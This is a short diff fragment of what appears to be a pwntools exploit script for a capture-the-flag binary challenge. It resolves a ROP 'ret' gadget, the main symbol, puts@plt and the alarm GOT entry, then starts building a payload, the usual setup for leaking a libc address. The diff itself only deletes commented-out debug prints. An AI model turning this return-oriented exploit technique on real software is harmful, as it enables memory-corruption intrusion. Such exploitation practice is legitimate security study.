@@ -21,10 +21,6 @@ ret = rop.find_gadget(["ret"])[0]
 main_function = exe.symbols.main
 puts_plt = exe.plt.puts
 alarm_got = exe.got.alarm
-#success(f"{hex(puts_plt)=}")
-
-#success(f"{hex(alarm_got)=}")
-
 payload = flat([
 offset,
 p64(ret),
